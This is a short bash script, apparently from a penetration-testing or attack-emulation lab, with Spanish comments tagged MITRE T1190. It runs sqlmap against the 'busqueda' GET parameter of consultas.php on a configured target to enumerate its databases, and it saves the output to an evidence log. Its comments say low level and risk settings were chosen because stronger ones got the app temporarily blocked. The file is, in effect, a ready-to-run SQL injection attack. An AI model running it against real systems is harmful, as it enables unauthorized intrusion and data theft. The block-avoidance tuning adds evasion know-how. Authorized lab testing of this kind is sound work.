#!/usr/bin/env bash
source "$(dirname "$0")/../config.sh"
echo "[T1190] Inyección SQL contra consultas.php en $TARGET_WEB (agent-linux)"
echo "Parámetro confirmado: 'busqueda', método GET (actualizado — el form ahora envía action=consultas.php method=GET)."
echo "Requiere que agent-db esté arriba para enumerar datos reales (la app depende de esa conexión)."
echo "Nivel/riesgo bajos a propósito: un nivel 5/riesgo 3 disparó un bloqueo temporal de la app la última vez."
sqlmap -u "http://$TARGET_WEB/consultas.php?busqueda=test" --batch --level=2 --risk=1 --dbs \
  | tee "$(dirname "$0")/../evidencia/03_sqlmap_$(date +%Y%m%d_%H%M).log"
